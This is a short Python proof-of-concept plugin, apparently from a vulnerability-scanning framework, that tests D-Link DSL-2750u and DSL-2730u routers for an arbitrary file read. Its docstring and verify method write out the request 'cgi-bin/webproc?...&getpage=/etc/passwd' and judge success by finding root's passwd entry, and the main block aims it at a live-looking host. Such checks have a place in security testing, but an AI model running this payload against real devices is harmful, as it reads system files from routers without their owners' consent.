#!/usr/bin/env python
# -*- coding: utf-8 -*-

'''
@author: gzh
@license: (C) Copyright 2013-2017, Node Supply Chain Manager Corporation Limited.
@contact: 937f5a138eb9c25ba5be79214f48bd31@qq.com
@software: PyCharm
@file: dlink_arbitrarily_webprocdl.py
@time: 2018/12/3 15:53
@desc: Dlink DSL-2750u and DSL-2730u - Authenticated Local File Disclosure and arbitrarily file download
@info: 访问 http://foobar/cgi-bin/webproc?var:page=wizard&var:menu=setup&getpage=/etc/passwd
读取任意文件,不只D-Link, 类似的有 Observa Telecom Home Station BHS-RTA 参见http://seclists.org/fulldisclosure/2015/May/129 可惜没找到测试样例
@refer: https://www.exploit-db.com/exploits/37516/
'''


from ..miniCurl import Curl
from ..t import T


class P(T):
	def __init__(self):
		T.__init__(self)
	
	def verify(self, head='', context='', ip='', port='', productname={}, keywords='', hackresults=''):
		arg = 'http://' + ip + ':' + port + '/'
		curl = Curl()
		result = {}
		result['result'] = False
		
		payload = 'cgi-bin/webproc?var:page=wizard&var:menu=setup&getpage=/etc/passwd'
		target = arg + payload
		
		code, head, res, body, _ = curl.curl2(target)
		if code == 200 and '/root:/bin/bash' in res:
			output(arg + 'D-Link 2750u / 2730u Local File Disclosure', result, 'hole')
		
		del curl
		return result


def output(url, result, label):
	info = url + '  dlink  Vul '
	result['result'] = True
	result['VerifyInfo'] = {}
	result['VerifyInfo']['type'] = 'fileread Vul'
	result['VerifyInfo']['URL'] = url
	result['VerifyInfo']['payload'] = '/thirdparty/www/www_745461f9306787f982cc186373fb3d15.py'
	result['VerifyInfo']['level'] = label
	result['VerifyInfo']['result'] = info


if __name__ == '__main__':
	print
	P().verify(ip='http://yunlai.cn:803/sfdsfds/', port='80')

# /root/github/poccreate/thirdparty/www/www_745461f9306787f982cc186373fb3d15.py
# /root/github/poccreate/codesrc/exp-1073.p